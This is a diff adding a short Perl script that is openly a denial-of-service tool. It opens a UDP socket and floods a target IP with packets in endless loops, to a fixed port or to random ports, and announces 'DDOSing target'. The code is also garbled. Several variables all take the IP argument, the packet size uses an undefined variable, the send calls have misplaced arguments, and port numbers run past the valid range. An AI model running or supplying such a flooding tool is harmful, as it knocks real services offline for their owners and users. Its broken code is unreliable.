@@ -1,0 +1,42 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+if ($ARGC !=1) {
+printf "[0;31m* [0;32m>Wrong command , use: [0;31m$0 <ip> [0;31m*[0m\n";
+exit(1);
+}
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+
+printf "[1;35m#[1;33m#[1;31m*[0;32m DDOSing target.: [1;36m$ip[0;32m ? Sending packets[0m\n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 8, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 79500) +0;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
